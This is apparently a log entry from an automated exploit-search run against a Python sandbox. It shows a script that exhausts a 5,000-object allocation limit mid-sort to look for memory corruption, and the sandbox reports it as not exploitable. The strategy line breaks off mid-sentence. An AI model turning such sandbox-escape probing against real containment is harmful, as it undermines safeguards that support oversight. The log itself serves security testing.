# Attempt 000 - 2026-06-05T19:39:23.605114+00:00
## Template: G | Score: 0 - Nothing - standard error or expected sandbox behavior
## Strategy
Pre-allocate approximately 4,980 objects via creating short-lived dict cycles in a loop, then build a list of 60 comparable items. Call `sorted(items, key=evil_key)` where `evil_key` allocates 4-5 objects per invocation (consuming the remaining ~20 allocation budget across just 4-5 comparisons). When MemoryError fires mid-sort, the internal sort state (indices/permutation) will be partially updated. After catching the error, inspect the partially-sorted result for out-of-bounds pointers, corrupt

## Exploit code
```python
import sys

results = []
counter = [0]

def track():
    counter[0] += 1
    return counter[0]

# Pre-allocate to ~4980 objects via short-lived dict cycles
pool = []
for i in range(4960):
    pool.append({'i': track(), 'p': 'A' * 10, 'ref': None})
# Create some reference cycles
for i in range(0, len(pool)-1, 2):
    pool[i]['ref'] = pool[i+1]
    pool[i+1]['ref'] = pool[i]

print(f"Pre-alloc count: {counter[0]}", file=sys.stderr)

# Build list of 60 comparable items
items = list(range(60))

alloc_log = []

def evil_key(x):
    # Allocate 4-5 objects per call to exhaust budget quickly
    a = {'k': track(), 'v': x, 'pad': 'E' * 15}
    b = {'k': track(), 'v': x, 'pad': 'F' * 15}
    c = [track(), track(), track()]
    d = {'k': track(), 'v': x}
    alloc_log.append((x, counter[0]))
    return x

try:
    result = sorted(items, key=evil_key)
    print(f"Sort completed normally. Result[:10]={result[:10]}", file=sys.stderr)
    results.append(('complete', result))
except MemoryError as e:
    print(f"MemoryError mid-sort: {e}", file=sys.stderr)
    print(f"Allocs before crash: {counter[0]}", file=sys.stderr)
    print(f"Keys computed: {alloc_log}", file=sys.stderr)
    results.append(('memerror', str(e), alloc_log))

# Try again with catch all
try:
    result2 = sorted(items, key=lambda x: x)
    print(f"Baseline sort len={len(result2)} first={result2[0]} last={result2[-1]}", file=sys.stderr)
    results.append(('baseline', len(result2), result2[0], result2[-1]))
except Exception as e:
    print(f"Baseline failed: {e}", file=sys.stderr)
    results.append(('baseline_err', str(e)))

# Check if result variable exists and is corrupted
try:
    print(f"result type={type(result)}", file=sys.stderr)
    print(f"result len={len(result)}", file=sys.stderr)
    if len(result) != 60:
        print(f"*** CORRUPTION: sorted result has wrong length {len(result)} ***", file=sys.stderr)
        results.append(('corrupt_len', len(result)))
    # Check for out-of-range values
    oob = [x for x in result if x < 0 or x >= 60]
    if oob:
        print(f"*** CORRUPTION: OOB values in result: {oob[:5]} ***", file=sys.stderr)
        results.append(('corrupt_oob', oob))
    # Check for duplicates or missing values
    if sorted(result) != list(range(60)):
        print(f"*** CORRUPTION: result is not a valid permutation ***", file=sys.stderr)
        results.append(('corrupt_perm'))
    else:
        print("Result is valid permutation", file=sys.stderr)
except Exception as e:
    print(f"Inspection error: {e}", file=sys.stderr)
    results.append(('inspect_err', str(e)))

# Force memoryerror in sort with different approach
pool.clear()
for i in range(4960):
    pool.append({'i': i, 'p': 'B' * 10})

def heavy_key(x):
    a = {'x': x, 'a': 1, 'b': 2, 'c': 3}
    b = {'x': x, 'd': 4, 'e': 5, 'f': 6}
    c = [x, x+1, x+2, x+3]
    d = {'g': x}
    e = [None, None, None]
    return x

try:
    r3 = sorted(range(80), key=heavy_key)
    results.append(('heavy_ok', len(r3)))
except MemoryError as e:
    results.append(('heavy_memerr', str(e)))
    try:
        print(f"heavy_result type={type(r3)}", file=sys.stderr)
    except:
        results.append(('heavy_no_result'))
except Exception as e:
    results.append(('heavy_other', str(e)))

print(f"RESULTS: {results}")
```

## Result
Category: resource_exhaustion
Context: alloc(5001/5000)
Details: Resource limit hit (expected sandbox behavior)
```
Success: False
Elapsed: 404ms
Resumes: 0
Snapshots: 0
Error: MemoryError: allocation limit exceeded: 5001 > 5000
Print: 
```

## Analysis
- MemoryError: allocation limit exceeded: 5001 > 5000
- Verdict: Not exploitable
